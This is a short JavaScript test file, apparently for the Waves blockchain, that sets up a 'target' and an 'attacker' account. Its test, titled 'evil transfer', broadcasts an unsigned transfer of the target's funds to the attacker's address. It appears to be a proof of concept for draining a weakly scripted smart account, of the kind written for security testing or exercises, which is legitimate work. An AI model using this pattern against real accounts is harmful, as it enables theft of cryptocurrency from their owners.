/**
 * A - target, B - attacker
 */
const accAAddr = "3NAEZLDh5hPZCMesPkL9vCd8R5MgvRfsebt";
const accBAddr = "3Mv6QNj1L7oKogspnPtEuZDWRDZCBeiFeK9";
const accAPK = "9mYdn1R1guTxbhpcsy8hdzaXgKLvsrb7h7da4h99Ygbr";

console.log("target address with waves: " + accAAddr);

it("evil transfer", async function () {
    let tx = await broadcast(transfer({
        amount: 100000000,
        recipient: accBAddr,
        senderPublicKey: accAPK,
        fee: 1000000
    }));
    await waitForTx(tx.id);
    console.log(JSON.stringify(tx))
});